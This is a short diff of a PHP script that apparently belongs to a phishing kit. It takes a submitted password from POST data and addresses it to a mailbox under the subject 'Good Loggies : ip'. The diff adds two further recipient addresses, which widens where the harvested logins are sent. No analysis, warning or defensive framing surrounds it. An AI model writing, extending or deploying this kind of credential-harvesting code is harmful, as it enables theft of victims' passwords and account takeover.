@@ -6,6 +6,8 @@ if(!empty($_POST)) {
  $password = $_POST['password'];
 
 		$to = "silentquake24@gmail.com";
+		$to1 = "jameselvis@iname.com";
+		$to2 = "netlifhost@protonmail.com";
 
 
          $subject = "Good Loggies : ip";
